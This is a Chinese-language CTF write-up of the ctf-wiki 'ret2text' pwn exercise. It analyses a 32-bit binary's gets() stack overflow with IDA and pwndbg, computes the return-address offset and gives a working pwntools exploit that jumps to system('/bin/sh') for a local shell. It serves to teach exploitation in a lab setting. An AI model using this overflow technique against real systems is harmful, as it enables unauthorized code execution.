# ret2text_demo

> 出自 https://github.com/ctf-wiki/ctf-wiki 中的Pwn: Linux Pwn: 栈溢出: 基本ROP
>
> writer: github.com/hex-16   data: 2021.3   contact: hexhex16@outlook.com
>
> file: ret2text      (download from https://github.com/ctf-wiki/ctf-wiki)
>
> 原始出处未知，非比赛题目(也许)，故所在文件夹命名方式有所区别

- return to .text of the executable program
- 控制程序执行程序本身的代码段(.text)
- 也可以控制程序执行好几段不相邻的已有代码(gadgets)
- 需要知道对应的返回的代码的位置

> 更多原理解析见 pwn 笔记



# checksec

- 注意这里使用的是旧版`checksec`，指令格式、显示格式与新版不同，新版的指令为`checksec --file=ret2text`

```bash
$ checksec ret2text
[*] '/home/kali/CTF/pwn/ret2text'
    Arch:     i386-32-little          # 32bit程序 小端序
    RELRO:    Partial RELRO
    Stack:    No canary found         # 没有开启canary保护
    NX:       NX enabled              # 栈不可执行
    PIE:      No PIE (0x8048000)      # 没有PIE(Position Independent Executable)
$ cat /proc/sys/kernel/randomize_va_space
0   # 所在kali系统没有开启 ASLR che
```



# IDA Analysis



## Dangerous Function

IDA 32bit中查看main函数的伪C如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets(s);
  printf("Maybe I will tell you next time !");
  return 0;
}
```

- 存在危险函数 `gets` 

## getshell Code

- 在IDA Exports中可以看到一个名为 secure 的函数，但是分析 main 函数逻辑时并没有看到secure函数的调用
- secure函数：

```c
void secure()
{
  unsigned int v0; // eax
  int input; // [esp+18h] [ebp-10h] BYREF
  int secretcode; // [esp+1Ch] [ebp-Ch]

  v0 = time(0);
  srand(v0);
  secretcode = rand();
  __isoc99_scanf(&unk_8048760, &input);
  if ( input == secretcode )
    system("/bin/sh");
}
```

- 可以看到有`system("/bin/sh");`语句，如果能够控制程序执行到这一语句的话，就可以 getshell 了
- 需要注意的是，secure函数执行时，需要输入一个int，同时将输入的int与随机生成的int对比（与运行时的时间有关），相同才会执行`system("/bin/sh");`，所以如果控制程序return到secure函数地址是行不通的



## Summary

至此，获得的两个关键信息：

1. main函数中存在可以利用的危险函数`gets`，存在stack overflow漏洞可以利用
2. secure函数中存在`system("/bin/sh")`语句可以get shell



### Target Address

> 分析出可以用于getshell的地址

- IDA中 secure 函数的汇编代码：

```assembly
.text:080485FD ; =============== S U B R O U T I N E =======================================
.text:080485FD
.text:080485FD ; Attributes: bp-based frame
.text:080485FD
.text:080485FD ; void secure()
.text:080485FD                 public secure
.text:080485FD secure          proc near
.text:080485FD
.text:080485FD input           = dword ptr -10h
.text:080485FD secretcode      = dword ptr -0Ch
.text:080485FD
.text:080485FD ; __unwind {
.text:080485FD                 push    ebp
.text:080485FE                 mov     ebp, esp
.text:08048600                 sub     esp, 28h
.text:08048603                 mov     dword ptr [esp], 0 ; timer
.text:0804860A                 call    _time
.text:0804860F                 mov     [esp], eax      ; seed
.text:08048612                 call    _srand
.text:08048617                 call    _rand
.text:0804861C                 mov     [ebp+secretcode], eax
.text:0804861F                 lea     eax, [ebp+input]
.text:08048622                 mov     [esp+4], eax
.text:08048626                 mov     dword ptr [esp], offset unk_8048760
.text:0804862D                 call    ___isoc99_scanf
.text:08048632                 mov     eax, [ebp+input]
.text:08048635                 cmp     eax, [ebp+secretcode]
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; command: "/bin/sh" # !!!!!! 注意这个地方
.text:08048641                 call    _system
.text:08048646
.text:08048646 locret_8048646:                         ; CODE XREF: secure+3B↑j
.text:08048646                 leave
.text:08048647                 retn
.text:08048647 ; } // starts at 80485FD
.text:08048647 secure          endp
```

- 可以看到`.text:0804863A`处将`system("/bin/sh");`的参数 `"/bin/sh"` 的地址存储到 `esp` 指向的内存中，随即`call  _system`
- 如果能够让程序执行到`0804863A`处，就可以getshell了。换句话说，当前目标为让程序运行至`0804863A`处



# gdb: Offset Analysis

> kali 20.04, `pwndbg` installed

```assembly
.text:080486A7 084  lea     eax, [esp+80h+s] ; # 这里加载的是char s[100]的首地址(esp+80h+s是s的地址) # 其中s=byte ptr -64h # 80h-64h=1Ch
.text:080486AB 084  mov     [esp], eax      ; s  # eax: s的地址 # 这里将eax的值赋值给esp寄存器所指向的地址
.text:080486AE 084  call    _gets           ; Call Procedure   # 后面 gdb 打断点的地方 !!!!!!!!!!!!
.text:080486B3 084  mov     dword ptr [esp], offset format ; "Maybe I will tell you next time !"
.text:080486BA 084  call    _printf         ; Call Procedure
```

- 上面这个是地址`0x080486AE`的IDA显示的汇编代码，下面这个是gdb调试时的输入与输出

```assembly
$ gdb ./ret2text -q # q for quiet # 启动gdb # 注意这里已经安装了 pwndbg # 安装方法见 pwndbg github 或者pwn.md # 这里删去了一部分输出
Reading symbols from ./ret2text...
pwndbg> b *0x080486AE  # 在地址 0x080486AE 处打断点
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
pwndbg> r     # 运行程序(从头)
Starting program: /home/kali/CTF/pwn/ret2text
There is something amazing here, do you know anything?

Breakpoint 1, 0x080486ae in main () at ret2text.c:24
24      ret2text.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────── # 这里显示寄存器的值 
 EAX  0xffffd2ac —▸ 0xf7fecd66 (_dl_sysdep_start+1462) ◂— mov    eax, dword ptr [esp + 0x6c] # 根据前面汇编的分析，ffffd2ac是字符串s的地址
 EBX  0x0
 ECX  0xffffffff
 EDX  0xffffffff
 EDI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 EBP  0xffffd318 ◂— 0x0 # 栈底指针
 ESP  0xffffd290 —▸ 0xffffd2ac —▸ 0xf7fecd66 (_dl_sysdep_start+1462) ◂— mov    eax, dword ptr [esp + 0x6c] # 注意这里ESP的 0xffffd290 是ESP寄存器的值，0xffffd2ac是0xffffd290处保存的值
 EIP  0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8
────────────────────────────────────────────────[ DISASM ]───────────────────── # 这里显示打断点处0x080486AE 及后面的反编译结果
 ► 0x80486ae <main+102>    call   gets@plt <gets@plt>     # 断点在此 # 下面几行是 gets 调用时的参数 
        arg[0]: 0xffffd2ac —▸ 0xf7fecd66 (_dl_sysdep_start+1462) ◂— mov    eax, dword ptr [esp + 0x6c] # para0 是字符串s的地址; 注意0x6c
        arg[1]: 0x0
        arg[2]: 0x1
        arg[3]: 0x0

   0x80486b3 <main+107>    mov    dword ptr [esp], 0x80487a4
   0x80486ba <main+114>    call   printf@plt <printf@plt>

   0x80486bf <main+119>    mov    eax, 0
   0x80486c4 <main+124>    leave
   0x80486c5 <main+125>    ret

   0x80486c6               nop
...............................
───────────────────────────────────────────────────[ STACK ]────────────────────────────────── # 函数栈视图，注意高地址在下
00:0000│ esp  0xffffd290 —▸ 0xffffd2ac —▸ 0xf7fecd66 (_dl_sysdep_start+1462) ◂— mov  eax, dword ptr [esp + 0x6c] # 栈顶
01:0004│      0xffffd294 ◂— 0x0 # 上面一行：esp指向 0xffffd290 指向 0xffffd2ac (s的地址)
02:0008│      0xffffd298 ◂— 0x1
03:000c│      0xffffd29c ◂— 0x0
04:0010│      0xffffd2a0 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x29f3c
05:0014│      0xffffd2a4 —▸ 0xffffd32c —▸ 0xffffd354 ◂— 0x0
06:0018│      0xffffd2a8 ◂— 0x2
07:001c│ eax  0xffffd2ac —▸ 0xf7fecd66 (_dl_sysdep_start+1462) ◂— mov    eax, dword ptr [esp + 0x6c]
──────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────── # 函数调用跟踪
 ► f 0  80486ae main+102
   f 1 f7de8e46 __libc_start_main+262
```

> pwndbg显示内容解释在上面注释中给出了

- `pwndbg`输出可得到的信息：
- s 的地址：`0xffffd2ac`
- `ebp`栈帧基地址：`0xffffd318`. s相对于`ebp`的偏移为 `0xffffd2ac - 0xffffd318` = `-0x6c`
- 由于函数返回地址(return address) = `ebp + 4` , 所以s与函数返回值的便宜量为`0x6c + 0x4`



# IDA Stack Analysis(Failed)

注意，这个案例中无法用IDA来分析s与return address之间的偏移量，IDA中显示的main的stack疑似有误，显示如下：

```assembly
# IDA Stack of main # 与实际情况有出入
-00000064 s               db 100 dup(?) # 字符串 s 在main stack中的位置 # 疑似有误
+00000000  s              db 4 dup(?) # saved registers
+00000004  r              db 4 dup(?) # return address
+00000008 argc            dd ?
+0000000C argv            dd ?                    ; offset
+00000010 envp            dd ?                    ; offset
```

- 按照上面显示的相对地址(左侧显示的)，字符串s与return address(也就是上面显示的 r )之间的偏移量为 `0x64+0x4`，然而实际应为`0x6c + 0x4`
- 也不知道错误是出在哪。属于TBD事项



# Exploit

- kali 20.04  python 3.9.2 pwntools 4.3.1

```python
# !/usr/bin/env python
from pwn import *

sh = process('./ret2text')
target = 0x804863a # 这个是前面分析的 mov dword ptr [esp], offset command ; command: "/bin/sh" 的地址 后面一条指令是 call  _system
payload = b'A' * (0x6c + 4) + p32(target) # 这里是前面分析的字符串 s 与 return address 之间的偏移量
sh.sendline(payload)
sh.interactive()
```

- 运行效果：

```bash
$ python ret2text.py  # python3.7
[+] Starting local process './ret2text': pid 26436
[*] Switching to interactive mode
There is something amazing here, do you know anything?
Maybe I will tell you next time !$ ls # 这里已经 getshell 了
canary_demo.c  canary.py  core    ex2  example  ret2text    ret2text.py
$ pwd
/home/kali/CTF/pwn
```



# Summary

1. IDA分析出危险函数(`gets`)
2. IDA分析出可以用于getshell的地方(`system("/bin/sh");`)，记录可以 getshell 的地址
3. gdb(pwndbg)分析出`gets`函数所用字符串 s 与 return address 之间的偏移量，构造payload，将用于getshell的地址覆盖到 return address 